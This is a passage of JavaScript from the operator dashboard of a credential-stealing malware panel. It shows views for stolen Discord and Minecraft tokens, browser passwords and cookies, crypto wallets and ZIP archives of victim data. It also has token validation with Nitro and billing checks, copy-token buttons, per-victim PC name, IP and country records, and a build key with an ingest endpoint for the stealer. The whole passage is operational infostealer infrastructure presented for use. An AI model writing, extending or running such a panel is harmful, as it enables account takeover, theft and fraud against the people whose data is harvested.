                        renderDiscordTokens();
                    }
                    
                    // Small delay to avoid rate limiting
                    await new Promise(r => setTimeout(r, 500));
                }
            }
            
            btn.innerHTML = originalText;
            btn.disabled = false;
            
            updateDiscordStats();
            renderDiscordTokens();
            toast(` ${valid} valid (${nitroCount} Nitro) |  ${invalid} invalid`, 'success');
        }
        
        // Discord Search Functions
        let discordSearchQuery = '';
        
        function searchDiscordTokens() {
            discordSearchQuery = document.getElementById('discordSearchInput').value.toLowerCase().trim();
            renderDiscordTokens();
        }
        
        function clearDiscordSearch() {
            discordSearchQuery = '';
            document.getElementById('discordSearchInput').value = '';
            renderDiscordTokens();
        }
        
        async function removeInvalidTokens() {
            if (!confirm('Remove all invalid tokens from the list?')) return;
            
            toast('Removing invalid tokens...', 'success');
            const res = await api('/api/discord/remove-invalid', 'POST');
            
            if (res.success) {
                // Remove from local array too
                allDiscordTokens = allDiscordTokens.filter(t => t.valid !== false);
                updateDiscordStats();
                renderDiscordTokens();
                toast(`Removed ${res.removed} invalid tokens`, 'success');
            } else {
                toast('Failed to remove invalid tokens', 'error');
            }
        }
        
        // Logs Search Functions
        let logsSearchQuery = '';
        let currentLogTypeFilter = 'all';
        
        async function searchLogs() {
            const query = document.getElementById('logsSearchInput').value.trim();
            if (!query) {
                toast('Please enter a search query', 'error');
                return;
            }
            
            logsSearchQuery = query;
            const res = await api(`/api/logs/search?q=${encodeURIComponent(query)}&type=${currentLogTypeFilter}`);
            
            if (res.success) {
                allLogs = res.logs;
                renderLogs(res.logs, 'logsGrid');
                toast(`Found ${res.count} results`, 'success');
            } else {
                toast(res.error || 'Search failed', 'error');
            }
        }
        
        function clearLogsSearch() {
            logsSearchQuery = '';
            document.getElementById('logsSearchInput').value = '';
            loadLogs();
        }
        
        // Login Logs Delete Functions
        function showClearLoginLogsModal() {
            document.getElementById('modalTitle').textContent = 'Clear Login Logs';
            document.getElementById('modalBody').innerHTML = `
                <p style="color: var(--text-secondary); margin-bottom: 20px;">Select what to clear:</p>
                
                <div style="display: flex; flex-direction: column; gap: 12px;">
                    <button class="btn btn-secondary" onclick="clearLoginLogsByType('all'); closeModal();" style="justify-content: flex-start;">
                        <i class="fas fa-trash"></i> Clear ALL Login Logs
                    </button>
                    <button class="btn btn-secondary" onclick="clearLoginLogsByType('failed'); closeModal();" style="justify-content: flex-start;">
                        <i class="fas fa-times"></i> Clear Failed Logins Only
                    </button>
                    <button class="btn btn-secondary" onclick="clearLoginLogsByType('successful'); closeModal();" style="justify-content: flex-start;">
                        <i class="fas fa-check"></i> Clear Successful Logins Only
                    </button>
                    <button class="btn btn-secondary" onclick="clearLoginLogsByType('old'); closeModal();" style="justify-content: flex-start;">
                        <i class="fas fa-clock"></i> Clear Logs Older Than 30 Days
                    </button>
                </div>
                
                <div style="margin-top: 20px; padding-top: 16px; border-top: 1px solid var(--border);">
                    <p style="color: var(--text-muted); font-size: 12px; margin-bottom: 10px;">Clear by specific IP:</p>
                    <div style="display: flex; gap: 8px;">
                        <input type="text" id="clearByIpInput" placeholder="Enter IP address..." 
                               style="flex: 1; padding: 8px 12px; background: var(--bg-secondary); border: 1px solid var(--border); border-radius: 6px; color: var(--text-primary);">
                        <button class="btn btn-secondary" onclick="clearLoginLogsByIp()">Clear</button>
                    </div>
                </div>
            `;
            document.getElementById('modal').classList.add('active');
        }
        
        async function clearLoginLogsByType(type) {
            const res = await api('/api/admin/login-logs/clear', 'POST', { type: type, days: 30 });
            
            if (res.success) {
                toast(`Cleared ${res.deleted} login logs`, 'success');
                loadLoginLogs();
            } else {
                toast('Failed to clear logs', 'error');
            }
        }
        
        async function clearLoginLogsByIp() {
            const ip = document.getElementById('clearByIpInput').value.trim();
            if (!ip) {
                toast('Please enter an IP address', 'error');
                return;
            }
            
            const res = await api('/api/admin/login-logs/clear', 'POST', { type: 'ip', ip: ip });
            
            if (res.success) {
                toast(`Cleared ${res.deleted} logs for IP ${ip}`, 'success');
                closeModal();
                loadLoginLogs();
            } else {
                toast('Failed to clear logs', 'error');
            }
        }
        
        function showTokenDetail(idx) {
            const token = allDiscordTokens[idx];
            if (!token) return;
            
            window.currentLogToken = token.token;
            
            const statusBadge = token.valid === true ? 
                '<span style="background: var(--success); color: white; padding: 4px 12px; border-radius: 12px; font-size: 12px;"><i class="fas fa-check"></i> Valid</span>' :
                token.valid === false ?
                '<span style="background: var(--danger); color: white; padding: 4px 12px; border-radius: 12px; font-size: 12px;"><i class="fas fa-times"></i> Invalid</span>' :
                '<span style="background: var(--text-muted); color: white; padding: 4px 12px; border-radius: 12px; font-size: 12px;"><i class="fas fa-question"></i> Unknown</span>';
            
            const sourceBadge = token.source === 'zip' ?
                '<span style="background: var(--success); color: white; padding: 4px 12px; border-radius: 12px; font-size: 12px;"><i class="fas fa-file-archive"></i> From ZIP</span>' :
                '<span style="background: var(--discord-blue); color: white; padding: 4px 12px; border-radius: 12px; font-size: 12px;"><i class="fas fa-bolt"></i> Direct</span>';
            
            // Nitro badge - check both has_nitro and nitro_type
            const hasNitro = token.has_nitro || (token.nitro_type && token.nitro_type !== 'No Nitro' && token.nitro_type !== '');
            const nitroLabel = token.nitro_type || (hasNitro ? 'Nitro' : '');
            const nitroBadge = hasNitro ? 
                `<span style="background: linear-gradient(90deg, #f47fff, #a855f7); color: white; padding: 4px 12px; border-radius: 12px; font-size: 12px;"><i class="fas fa-crown"></i> ${nitroLabel}</span>` : '';
            
            // MFA badge
            const mfaBadge = token.mfa_enabled ?
                '<span style="background: var(--accent); color: white; padding: 4px 12px; border-radius: 12px; font-size: 12px;"><i class="fas fa-lock"></i> 2FA</span>' : '';
            
            // Avatar URL
            let avatarUrl = 'https://cdn.discordapp.com/embed/avatars/0.png';
            if (token.user_id && token.avatar) {
                avatarUrl = `https://cdn.discordapp.com/avatars/${token.user_id}/${token.avatar}.png?size=128`;
            }
            
            // Banner
            let bannerHtml = '';
            if (token.user_id && token.banner) {
                bannerHtml = `<div style="background: url('https://cdn.discordapp.com/banners/${token.user_id}/${token.banner}.png?size=600') center/cover; height: 100px; border-radius: 8px; margin-bottom: 16px;"></div>`;
            }
            
            let content = `
                ${bannerHtml}
                <div style="display: flex; gap: 8px; margin-bottom: 16px; flex-wrap: wrap;">
                    ${statusBadge}
                    ${sourceBadge}
                    ${nitroBadge}
                    ${mfaBadge}
                </div>
                
                <!-- User Profile Header -->
                <div style="display: flex; align-items: center; background: var(--bg-secondary); padding: 20px; border-radius: 12px; margin-bottom: 16px;">
                    <img src="${avatarUrl}" style="width: 80px; height: 80px; border-radius: 50%; margin-right: 20px; border: 3px solid ${hasNitro ? '#a855f7' : 'var(--discord-blue)'};" onerror="this.src='https://cdn.discordapp.com/embed/avatars/0.png'">
                    <div>
                        <div style="font-size: 22px; font-weight: 700; margin-bottom: 4px;">${token.username || 'Unknown'}</div>
                        ${token.user_id ? `<div style="color: var(--text-muted); font-size: 12px;">ID: ${token.user_id}</div>` : ''}
                        ${token.email ? `<div style="color: var(--text-secondary); font-size: 13px; margin-top: 6px;"><i class="fas fa-envelope" style="width: 16px;"></i> ${token.email}</div>` : ''}
                        ${token.phone ? `<div style="color: var(--text-secondary); font-size: 13px; margin-top: 2px;"><i class="fas fa-phone" style="width: 16px;"></i> ${token.phone}</div>` : ''}
                    </div>
                </div>
                
                <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 16px; margin-bottom: 16px;">
                    <div style="background: var(--bg-secondary); padding: 16px; border-radius: 8px;">
                        <div style="font-weight: 600; margin-bottom: 12px; color: var(--discord-blue);">
                            <i class="fab fa-discord"></i> Account Info
                        </div>
                        <div style="font-size: 13px; line-height: 1.8;">
                            <div><strong>2FA:</strong> ${token.mfa_enabled ? ' Enabled' : ' Disabled'}</div>
                            <div><strong>Verified:</strong> ${token.verified ? ' Yes' : ' No'}</div>
                            <div><strong>Billing:</strong> ${token.has_billing ? ' Yes' : ' No'}</div>
                            <div><strong>Guilds:</strong> ${token.guild_count || 0}</div>
                            <div><strong>Friends:</strong> ${token.friends_count || 0}</div>
                        </div>
                    </div>
                    
                    <div style="background: var(--bg-secondary); padding: 16px; border-radius: 8px;">
                        <div style="font-weight: 600; margin-bottom: 12px; color: var(--accent);">
                            <i class="fas fa-laptop"></i> Victim Info
                        </div>
                        <div style="font-size: 13px; line-height: 1.8;">
                            <div><strong>PC:</strong> ${token.pc_name}</div>
                            <div><strong>User:</strong> ${token.pc_user}</div>
                            <div><strong>IP:</strong> ${token.ip}</div>
                            <div><strong>Country:</strong> ${token.country}</div>
                            <div><strong>Date:</strong> ${new Date(token.created_at).toLocaleString()}</div>
                        </div>
                    </div>
                </div>
            `;
            
            if (token.badges && token.badges.length > 0) {
                content += `
                    <div style="background: var(--bg-secondary); padding: 16px; border-radius: 8px; margin-bottom: 16px;">
                        <div style="font-weight: 600; margin-bottom: 12px; color: var(--success);">
                            <i class="fas fa-medal"></i> Badges (${token.badges.length})
                        </div>
                        <div style="display: flex; flex-wrap: wrap; gap: 6px;">
                            ${token.badges.map(badge => `
                                <span style="background: var(--accent); color: white; padding: 4px 8px; border-radius: 12px; font-size: 11px;">
                                    ${badge}
                                </span>
                            `).join('')}
                        </div>
                    </div>
                `;
            }
            
            if (token.source === 'zip' && token.source_file) {
                content += `
                    <div style="background: var(--bg-secondary); padding: 12px; border-radius: 8px; margin-bottom: 16px; font-size: 13px;">
                        <i class="fas fa-file-archive" style="color: var(--success);"></i>
                        <strong>Source File:</strong> ${token.source_file}
                    </div>
                `;
            }
            
            content += `
                <div style="background: var(--bg-secondary); padding: 20px; border-radius: 8px; margin-bottom: 16px;">
                    <div style="font-size: 11px; color: var(--text-muted); margin-bottom: 8px;">DISCORD TOKEN</div>
                    <div style="font-family: monospace; font-size: 11px; word-break: break-all; color: var(--discord-blue); background: var(--bg-primary); padding: 12px; border-radius: 6px; max-height: 120px; overflow-y: auto;">
                        ${token.token}
                    </div>
                </div>
                
                <div style="display: flex; gap: 8px;">
                    <button class="btn btn-primary" style="flex: 1;" onclick="copyToken('currentLogToken', this)">
                        <i class="fas fa-copy"></i> Copy Token
                    </button>
                    <button class="btn btn-secondary" style="flex: 1;" onclick="validateToken(${idx}); closeModal();">
                        <i class="fas fa-check"></i> Validate
                    </button>
                </div>
            `;
            
            document.getElementById('modalTitle').textContent = `Discord Token: ${token.username || 'Unknown'}`;
            document.getElementById('modalBody').innerHTML = content;
            document.getElementById('modal').classList.add('active');
        }

        // Dashboard
        async function loadDashboard() {
            const res = await api('/api/dashboard');
            if (!res.success) return;
            
            const s = res.stats;
            document.getElementById('statsGrid').innerHTML = `
                <div class="stat-card">
                    <div class="stat-card-header">
                        <div class="stat-card-icon mc"><i class="fas fa-cube"></i></div>
                    </div>
                    <div class="stat-card-value">${s.mc_sessions || 0}</div>
                    <div class="stat-card-label">MC Sessions</div>
                </div>
                <div class="stat-card">
                    <div class="stat-card-header">
                        <div class="stat-card-icon blue"><i class="fab fa-discord"></i></div>
                    </div>
                    <div class="stat-card-value">${s.tokens || 0}</div>
                    <div class="stat-card-label">Discord Tokens</div>
                </div>
                <div class="stat-card">
                    <div class="stat-card-header">
                        <div class="stat-card-icon yellow"><i class="fas fa-key"></i></div>
                    </div>
                    <div class="stat-card-value">${s.passwords || 0}</div>
                    <div class="stat-card-label">Passwords</div>
                </div>
                <div class="stat-card">
                    <div class="stat-card-header">
                        <div class="stat-card-icon red"><i class="fas fa-wallet"></i></div>
                    </div>
                    <div class="stat-card-value">${s.wallets || 0}</div>
                    <div class="stat-card-label">Wallets</div>
                </div>
                <div class="stat-card">
                    <div class="stat-card-header">
                        <div class="stat-card-icon green"><i class="fas fa-file-archive"></i></div>
                    </div>
                    <div class="stat-card-value">${s.zips || 0}</div>
                    <div class="stat-card-label">ZIP Files</div>
                </div>
                <div class="stat-card">
                    <div class="stat-card-header">
                        <div class="stat-card-icon purple"><i class="fas fa-users"></i></div>
                    </div>
                    <div class="stat-card-value">${s.victims || 0}</div>
                    <div class="stat-card-label">Victims</div>
                </div>
            `;
            
            allLogs = res.logs;
            // Render all recent logs (no client-side limit)
            renderLogs(res.logs, 'recentLogs');
        }

        // Logs
        // Load logs (optionally by type). For type-specific views we request from the server
        // so we get all matching logs (not just the subset previously loaded).
        async function loadLogs(type = 'all') {
            currentLogTypeFilter = type;  // Track current filter for search
            
            // If filtering by specific type, ask the server for that type (admins get all users)
            let endpoint = '/api/logs';
            if (type && type !== 'all') endpoint = `/api/logs?type=${encodeURIComponent(type)}`;

            const res = await api(endpoint);
            if (res.success) {
                // Keep a copy of the last fetched logs for quick local filtering
                allLogs = res.logs;
                renderLogs(res.logs, 'logsGrid');
            }
        }

        function filterLogs(type) {
            currentLogTypeFilter = type;  // Track current filter for search
            
            // Manage active button classes inside the logs filter bar only
            document.querySelectorAll('#page-logs .filter-btn').forEach(b => b.classList.remove('active'));
            try { event.target.classList.add('active'); } catch (_) {}

            if (type === 'all') {
                // Load a recent subset (default)
                loadLogs('all');
                return;
            }

            // For specific types (e.g. 'minecraft') request server-side filtered logs
            loadLogs(type);
        }

        function renderLogs(logs, containerId) {
            const container = document.getElementById(containerId);
            if (!logs.length) {
                container.innerHTML = '<p style="color: var(--text-muted); padding: 20px;">No logs yet</p>';
                return;
            }
            
            container.innerHTML = logs.map(log => {
                const data = typeof log.data === 'string' ? JSON.parse(log.data) : log.data;
                const preview = getPreview(log.log_type, data);
                const icon = getTypeIcon(log.log_type);
                const time = new Date(log.created_at).toLocaleString();
                
                return `
                <div class="log-card">
                    <div class="log-card-header">
                        <div class="log-card-type">
                            <span class="log-type-badge ${log.log_type}">${icon} ${log.log_type}</span>
                        </div>
                        <div class="log-card-actions">
                            <button class="btn btn-secondary btn-icon" onclick="downloadLog(${log.id})" title="Download">
                                <i class="fas fa-download"></i>
                            </button>
                            <button class="btn btn-secondary btn-icon" onclick="deleteLog(${log.id})" title="Delete">
                                <i class="fas fa-trash"></i>
                            </button>
                        </div>
                    </div>
                    <div class="log-card-body">
                        <div class="log-info-row">
                            <i class="fas fa-desktop"></i>
                            <span>${log.pc_name}</span>
                        </div>
                        <div class="log-info-row">
                            <i class="fas fa-user"></i>
                            <span>${log.pc_user}</span>
                        </div>
                        <div class="log-info-row">
                            <i class="fas fa-globe"></i>
                            <span>${log.ip} (${log.country})</span>
                        </div>
                        ${preview}
                    </div>
                    <div class="log-card-footer">
                        <span>${time}</span>
                        <button class="btn btn-secondary btn-sm" onclick="showLogDetail(${log.id})">View Details</button>
                    </div>
                </div>
                `;
            }).join('');
        }

        function getTypeIcon(type) {
            const icons = {
                minecraft: '<i class="fas fa-cube"></i>',
                discord: '<i class="fab fa-discord"></i>',
                browser: '<i class="fas fa-globe"></i>',
                wallet: '<i class="fas fa-wallet"></i>',
                system: '<i class="fas fa-laptop"></i>',
                zip: '<i class="fas fa-file-archive"></i>'
            };
            return icons[type] || '<i class="fas fa-file"></i>';
        }

        function getPreview(type, data) {
            if (!data) return '';
            
            if (type === 'minecraft') {
                const token = data.access_token || '';
                const preview = token.substring(0, 50) + (token.length > 50 ? '...' : '');
                const tokenId = 'mc_' + Math.random().toString(36).substr(2, 9);
                window[tokenId] = token;
                return `
                <div class="log-preview">
                    <div class="log-preview-title">Player: ${data.player || 'Unknown'}</div>
                    <div class="log-preview-copy">
                        <div class="log-preview-content">${preview || 'No token'}</div>
                        <button class="copy-btn" onclick="copyToken('${tokenId}', this)">Copy Token</button>
                    </div>
                </div>`;
            }
            
            if (type === 'discord') {
                const token = data.token || '';
                const preview = token.substring(0, 35) + (token.length > 35 ? '...' : '');
                const tokenId = 'dc_' + Math.random().toString(36).substr(2, 9);
                window[tokenId] = token;
                
                const isEnhanced = data.enhanced || false;
                let userInfo = data.username || 'Unknown';
                let additionalInfo = '';
                
                if (isEnhanced) {
                    const nitroStatus = data.nitro_type && data.nitro_type !== 'No Nitro' ? '' : '';
                    const billingStatus = data.has_billing ? '' : '';
                    const mfaStatus = data.mfa_enabled ? '' : '';
                    const badgeCount = data.badges ? data.badges.length : 0;
                    const guildCount = data.guild_count || 0;
                    
                    additionalInfo = `
                        <div style="display: flex; gap: 8px; margin-top: 6px; font-size: 11px;">
                            ${nitroStatus ? `<span style="color: var(--warning);" title="Nitro: ${data.nitro_type}">${nitroStatus}</span>` : ''}
                            ${billingStatus ? `<span style="color: var(--success);" title="Has Billing">${billingStatus}</span>` : ''}
                            ${mfaStatus ? `<span style="color: var(--accent);" title="2FA Enabled">${mfaStatus}</span>` : ''}
                            ${badgeCount > 0 ? `<span style="color: var(--danger);" title="${badgeCount} Badges">${badgeCount}</span>` : ''}
                            ${guildCount > 0 ? `<span style="color: var(--text-secondary);" title="${guildCount} Guilds">${guildCount}</span>` : ''}
                        </div>
                    `;
                }
                
                return `
                <div class="log-preview">
                    <div class="log-preview-title" style="position: relative;">
                        ${userInfo}
                        ${isEnhanced ? '<span style="position: absolute; top: -2px; right: 0; background: var(--success); color: white; font-size: 8px; padding: 1px 4px; border-radius: 8px;">ENHANCED</span>' : ''}
                        ${data.email ? '<div style="font-size: 11px; color: var(--text-muted); margin-top: 2px;">' + data.email + '</div>' : ''}
                        ${additionalInfo}
                    </div>
                    <div class="log-preview-copy">
                        <div class="log-preview-content">${preview || 'No token'}</div>
                        <button class="copy-btn" onclick="copyToken('${tokenId}', this)">Copy Token</button>
                    </div>
                </div>`;
            }
            
            if (type === 'zip') {
                const size = data.size ? (data.size / 1024 / 1024).toFixed(2) + ' MB' : 'Unknown size';
                return `
                <div class="log-preview">
                    <div class="log-preview-title"><i class="fas fa-file-archive" style="color: var(--success);"></i> Data Package</div>
                    <div class="log-preview-content">
                        Size: <span style="color: var(--success)">${size}</span><br>
                        Contains: Browser data, Wallets, Discord, Telegram, Gaming
                    </div>
                </div>`;
            }
            
            if (type === 'browser') {
                const pw = data.passwords?.length || 0;
                const ck = data.cookies?.length || 0;
                return `
                <div class="log-preview">
                    <div class="log-preview-title">Browser Data</div>
                    <div class="log-preview-content">
                        <span style="color: var(--warning)">${pw} passwords</span>  
                        <span style="color: var(--success)">${ck} cookies</span>
                    </div>
                </div>`;
            }
            
            if (type === 'wallet') {
                return `
                <div class="log-preview">
                    <div class="log-preview-title">${data.wallet_name || 'Wallet'}</div>
                    <div class="log-preview-content">${data.wallet_type || 'Unknown type'}</div>
                </div>`;
            }
            
            return '';
        }

        function copyToken(tokenId, btn) {
            const text = window[tokenId] || '';
            navigator.clipboard.writeText(text).then(() => {
                btn.textContent = 'Copied!';
                btn.classList.add('copied');
                setTimeout(() => {
                    btn.textContent = 'Copy Token';
                    btn.classList.remove('copied');
                }, 2000);
            }).catch(() => {
                // Fallback
                const ta = document.createElement('textarea');
                ta.value = text;
                document.body.appendChild(ta);
                ta.select();
                document.execCommand('copy');
                document.body.removeChild(ta);
                btn.textContent = 'Copied!';
                btn.classList.add('copied');
                setTimeout(() => {
                    btn.textContent = 'Copy Token';
                    btn.classList.remove('copied');
                }, 2000);
            });
        }

        function copyText(text, btn) {
            navigator.clipboard.writeText(text).then(() => {
                btn.textContent = 'Copied!';
                btn.classList.add('copied');
                setTimeout(() => {
                    btn.textContent = 'Copy Token';
                    btn.classList.remove('copied');
                }, 2000);
            });
        }

        async function showLogDetail(id) {
            const res = await api(`/api/logs/${id}`);
            if (!res.success) return;
            
            const log = res.log;
            const data = typeof log.data === 'string' ? JSON.parse(log.data) : log.data;
            
            // Store token globally for copy
            window.currentLogToken = null;
            
            let content = '';
            
            if (log.log_type === 'minecraft') {
                // MC: Show only token with big copy button
                const token = data.access_token || '';
                window.currentLogToken = token;
                document.getElementById('modalTitle').textContent = `MC Session: ${data.player || 'Unknown'}`;
                content = `
                    <div style="margin-bottom: 16px; color: var(--text-secondary);">
                        <i class="fas fa-user"></i> ${log.pc_user} @ ${log.pc_name}<br>
                        <i class="fas fa-globe"></i> ${log.ip} (${log.country})<br>
                        <i class="fas fa-gamepad"></i> UUID: ${data.uuid || 'Unknown'}
                    </div>
                    <div style="background: var(--bg-secondary); padding: 20px; border-radius: 8px; margin-bottom: 16px;">
                        <div style="font-size: 11px; color: var(--text-muted); margin-bottom: 8px;">ACCESS TOKEN</div>
                        <div style="font-family: monospace; font-size: 11px; word-break: break-all; color: var(--mc-green); max-height: 200px; overflow: auto;">${token || 'No token available'}</div>
                    </div>
                    <button class="btn btn-primary" style="width: 100%; justify-content: center;" onclick="copyToken('currentLogToken', this)">
                        <i class="fas fa-copy"></i> Copy MC Token
                    </button>
                `;
            } else if (log.log_type === 'discord') {
                // Enhanced Discord: Show comprehensive user information
                const token = data.token || '';
                const isEnhanced = data.enhanced || false;
                window.currentLogToken = token;
                
                let avatarUrl = 'https://cdn.discordapp.com/embed/avatars/0.png';
                let bannerStyle = '';
                
                if (isEnhanced && data.avatar) {
                    avatarUrl = `https://cdn.discordapp.com/avatars/${data.user_id}/${data.avatar}.png?size=256`;
                }
                
                if (isEnhanced && data.banner) {
                    bannerStyle = `background: url('https://cdn.discordapp.com/banners/${data.user_id}/${data.banner}.png?size=1024') center/cover; min-height: 120px; border-radius: 8px; margin-bottom: 16px;`;
                }
                
                document.getElementById('modalTitle').textContent = `Discord: ${data.username || 'Unknown'}`;
                
                let content = '';
                
                // Banner if available
                if (isEnhanced && data.banner) {
                    content += `<div style="${bannerStyle}"></div>`;
                }
                
                // User avatar and basic info
                content += `
                    <div style="display: flex; align-items: center; margin-bottom: 20px; padding: 16px; background: var(--bg-secondary); border-radius: 12px;">
                        <img src="${avatarUrl}" style="width: 64px; height: 64px; border-radius: 50%; margin-right: 16px; border: 3px solid var(--discord-blue);">
                        <div>
                            <div style="font-size: 18px; font-weight: 600; margin-bottom: 4px;">${data.username || 'Unknown'}</div>
                            <div style="color: var(--text-secondary); font-size: 14px;">
                                <i class="fas fa-id-badge"></i> ${data.user_id || 'Unknown ID'}
                            </div>
                        </div>
                    </div>
                `;
                
                if (isEnhanced) {
                    // Enhanced information sections
                    content += `
                        <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 16px; margin-bottom: 20px;">
                            <div style="background: var(--bg-secondary); padding: 16px; border-radius: 8px;">
                                <div style="font-weight: 600; margin-bottom: 12px; color: var(--accent);">
                                    <i class="fas fa-user-circle"></i> Account Info
                                </div>
                                <div style="font-size: 13px; line-height: 1.5;">
                                    <div><strong>Email:</strong> ${data.email || 'No email'}</div>
                                    <div><strong>Phone:</strong> ${data.phone || 'No phone'}</div>
                                    <div><strong>Locale:</strong> ${data.locale || 'Unknown'}</div>
                                    <div><strong>2FA:</strong> ${data.mfa_enabled ? ' Enabled' : ' Disabled'}</div>
                                </div>
                            </div>
                            
                            <div style="background: var(--bg-secondary); padding: 16px; border-radius: 8px;">
                                <div style="font-weight: 600; margin-bottom: 12px; color: var(--warning);">
                                    <i class="fas fa-crown"></i> Premium & Billing
                                </div>
                                <div style="font-size: 13px; line-height: 1.5;">
                                    <div><strong>Nitro:</strong> ${data.nitro_type || 'No Nitro'}</div>
                                    <div><strong>Billing:</strong> ${data.has_billing ? ' Yes' : ' No'}</div>
                                    <div><strong>Payment Methods:</strong> ${data.payment_methods || 0}</div>
                                    <div><strong>Guilds:</strong> ${data.guild_count || 0} (${data.owned_guilds || 0} owned)</div>
                                </div>
                            </div>
                        </div>
                    `;
                    
                    // Badges section
                    if (data.badges && data.badges.length > 0) {
                        content += `
                            <div style="background: var(--bg-secondary); padding: 16px; border-radius: 8px; margin-bottom: 16px;">
                                <div style="font-weight: 600; margin-bottom: 12px; color: var(--success);">
                                    <i class="fas fa-medal"></i> Badges
                                </div>
                                <div style="display: flex; flex-wrap: wrap; gap: 6px;">
                                    ${data.badges.map(badge => `
                                        <span style="background: var(--accent); color: white; padding: 4px 8px; border-radius: 12px; font-size: 11px; font-weight: 500;">
                                            ${badge}
                                        </span>
                                    `).join('')}
                                </div>
                            </div>
                        `;
                    }
                    
                    // Bio section
                    if (data.bio && data.bio !== 'No bio') {
                        content += `
                            <div style="background: var(--bg-secondary); padding: 16px; border-radius: 8px; margin-bottom: 16px;">
                                <div style="font-weight: 600; margin-bottom: 8px; color: var(--text-secondary);">
                                    <i class="fas fa-quote-left"></i> Bio
                                </div>
                                <div style="font-style: italic; color: var(--text-secondary); font-size: 14px;">
                                    "${data.bio}"
                                </div>
                            </div>
                        `;
                    }
                    
                    // Rare friends section
                    if (data.rare_friends && data.rare_friends.length > 0) {
                        content += `
                            <div style="background: var(--bg-secondary); padding: 16px; border-radius: 8px; margin-bottom: 16px;">
                                <div style="font-weight: 600; margin-bottom: 12px; color: var(--danger);">
                                    <i class="fas fa-star"></i> Rare Friends (${data.rare_friends.length})
                                </div>
                                <div style="max-height: 200px; overflow-y: auto;">
                                    ${data.rare_friends.map(friend => `
                                        <div style="padding: 8px; margin-bottom: 6px; background: var(--bg-primary); border-radius: 6px; border-left: 3px solid var(--danger);">
                                            <div style="font-weight: 500; margin-bottom: 4px;">${friend.username}#${friend.discriminator}</div>
                                            <div style="font-size: 11px; color: var(--text-muted);">
                                                ${friend.badges.join(', ')}
                                            </div>
                                        </div>
                                    `).join('')}
                                </div>
                            </div>
                        `;
                    }
                } else {
                    // Basic Discord info (non-enhanced)
                    content += `
                        <div style="margin-bottom: 16px; color: var(--text-secondary);">
                            <i class="fas fa-envelope"></i> ${data.email || 'No email'}<br>
                            <i class="fas fa-phone"></i> ${data.phone || 'No phone'}<br>
                            <i class="fas fa-user"></i> ${log.pc_user} @ ${log.pc_name}
                        </div>
                    `;
                }
                
                // System info
                content += `
                    <div style="background: var(--bg-secondary); padding: 12px; border-radius: 8px; margin-bottom: 16px; font-size: 13px; color: var(--text-muted);">
                        <i class="fas fa-desktop"></i> ${log.pc_user} @ ${log.pc_name}  
                        <i class="fas fa-globe"></i> ${log.ip} (${log.country || 'Unknown'})  
                        <i class="fas fa-clock"></i> ${new Date(log.created_at).toLocaleString()}
                    </div>
                `;
                
                // Token section
                content += `
                    <div style="background: var(--bg-secondary); padding: 20px; border-radius: 8px; margin-bottom: 16px;">
                        <div style="font-size: 11px; color: var(--text-muted); margin-bottom: 8px; display: flex; justify-content: between; align-items: center;">
                            <span>DISCORD TOKEN</span>
                            <span style="background: ${isEnhanced ? 'var(--success)' : 'var(--warning)'}; color: white; padding: 2px 6px; border-radius: 10px; font-size: 9px;">
                                ${isEnhanced ? 'ENHANCED' : 'BASIC'}
                            </span>
                        </div>
                        <div style="font-family: monospace; font-size: 11px; word-break: break-all; color: var(--discord-blue); background: var(--bg-primary); padding: 12px; border-radius: 6px; max-height: 120px; overflow-y: auto;">
                            ${token || 'No token available'}
                        </div>
                    </div>
                    <button class="btn btn-primary" style="width: 100%; justify-content: center;" onclick="copyToken('currentLogToken', this)">
                        <i class="fas fa-copy"></i> Copy Discord Token
                    </button>
                `;
            } else if (log.log_type === 'zip') {
                // ZIP: Show download button prominently
                const size = data.size ? (data.size / 1024 / 1024).toFixed(2) + ' MB' : 'Unknown';
                document.getElementById('modalTitle').textContent = `ZIP Package`;
                content = `
                    <div style="margin-bottom: 16px; color: var(--text-secondary);">
                        <i class="fas fa-user"></i> ${log.pc_user} @ ${log.pc_name}<br>
                        <i class="fas fa-globe"></i> ${log.ip} (${log.country})<br>
                        <i class="fas fa-clock"></i> ${new Date(log.created_at).toLocaleString()}
                    </div>
                    <div style="background: var(--bg-secondary); padding: 20px; border-radius: 8px; margin-bottom: 16px; text-align: center;">
                        <i class="fas fa-file-archive" style="font-size: 48px; color: var(--success); margin-bottom: 16px; display: block;"></i>
                        <div style="font-size: 24px; font-weight: 700; color: var(--success); margin-bottom: 8px;">${size}</div>
                        <div style="font-size: 12px; color: var(--text-muted);">
                            Contains: Browser Data, Cookies, Passwords, Discord Tokens, Wallets, Telegram, Gaming Data
                        </div>
                    </div>
                    <button class="btn btn-primary" style="width: 100%; justify-content: center;" onclick="downloadLog(${log.id})">
                        <i class="fas fa-download"></i> Download ZIP
                    </button>
                `;
            } else {
                // Other types: Show full JSON
                document.getElementById('modalTitle').textContent = `${log.log_type.toUpperCase()} Log`;
                content = `
                    <div style="margin-bottom: 16px;">
                        <strong>PC:</strong> ${log.pc_name}<br>
                        <strong>User:</strong> ${log.pc_user}<br>
                        <strong>IP:</strong> ${log.ip} (${log.country})<br>
                        <strong>Time:</strong> ${new Date(log.created_at).toLocaleString()}
                    </div>
                    <div style="background: var(--bg-secondary); padding: 16px; border-radius: 8px; max-height: 400px; overflow: auto;">
                        <pre style="font-family: monospace; font-size: 12px; white-space: pre-wrap; word-break: break-all;">${JSON.stringify(data, null, 2)}</pre>
                    </div>
                    <div style="margin-top: 16px;">
                        <button class="btn btn-primary" onclick="downloadLog(${log.id})">
                            <i class="fas fa-download"></i> Download
                        </button>
                    </div>
                `;
            }
            
            document.getElementById('modalBody').innerHTML = content;
            document.getElementById('modal').classList.add('active');
        }

        function closeModal() {
            document.getElementById('modal').classList.remove('active');
        }

        function downloadLog(id) {
            window.open(`/api/logs/${id}/download?token=${token}`, '_blank');
        }

        async function deleteLog(id) {
            // Show password prompt modal
            const password = prompt('Enter YOUR password to delete this log (moved to trash):', '');
            if (!password) return;
            
            const res = await api(`/api/logs/${id}`, 'DELETE', { password });
            if (!res.success) {
                toast(res.error || 'Failed to delete log', 'error');
                return;
            }
            
            toast('Log moved to trash');
            loadDashboard();
            loadLogs();
        }

        // Settings
        function loadSettings() {
            document.getElementById('buildKey').textContent = currentUser.build_key;
            document.getElementById('apiEndpoint').textContent = window.location.origin + '/api/data/' + currentUser.build_key;
        }

        async function changePassword() {
            const current = document.getElementById('currentPassword').value;
            const newPw = document.getElementById('newPassword').value;
            
            if (newPw.length < 6) return toast('Password must be at least 6 characters', 'error');
            
            const res = await api('/api/settings/password', 'POST', { current, new: newPw });
            if (res.success) {
